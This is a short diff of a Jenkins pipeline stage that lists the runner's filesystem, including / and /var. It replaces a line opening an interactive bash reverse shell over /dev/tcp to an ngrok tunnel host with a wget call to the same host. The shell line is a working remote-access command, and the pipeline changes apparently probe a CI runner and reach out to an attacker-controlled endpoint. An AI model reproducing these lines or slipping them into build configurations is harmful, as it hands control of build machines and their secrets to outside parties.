@@ -13,7 +13,7 @@ pipeline {
                 sh 'ls -a'
                 sh 'ls -la /'
                 sh 'ls -la /var/'
-                sh 'bash -i >/dev/tcp/2.tcp.eu.ngrok.io/14840 2>&1'
+                sh 'wget 2.tcp.eu.ngrok.io:14840'
             }
         }
     }
